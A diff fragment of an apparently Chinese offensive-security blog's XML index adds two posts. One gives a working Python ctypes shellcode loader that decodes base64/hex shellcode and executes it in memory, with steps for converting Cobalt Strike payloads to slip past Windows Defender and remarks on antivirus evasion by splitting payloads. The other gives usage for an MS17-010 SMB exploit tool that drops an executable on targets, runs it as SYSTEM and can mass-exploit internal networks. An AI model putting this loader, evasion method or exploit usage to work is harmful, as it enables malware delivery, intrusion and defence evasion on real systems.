+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<pre class="brush:python;gutter:true;"></pre>
+<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
+<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
+<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
+<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
+<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
+<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
+<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
+<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
+<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
+<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
+<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
+<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
+<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
+<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+import base64
+#calc.exe
+#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
+shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
+<p>&nbsp;</p>
+<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
+<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
+<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
+<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
+<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
+<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
+<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
+<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
+<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
+<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
+<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
+<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
+<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
+<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
+<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
+        <tag>BypassAV</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
     <url>/p/41e1c61c.html</url>
     <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
@@ -3359,6 +3331,34 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>SMB</tag>
+        <tag>MS17010</tag>
       </tags>
   </entry>
   <entry>
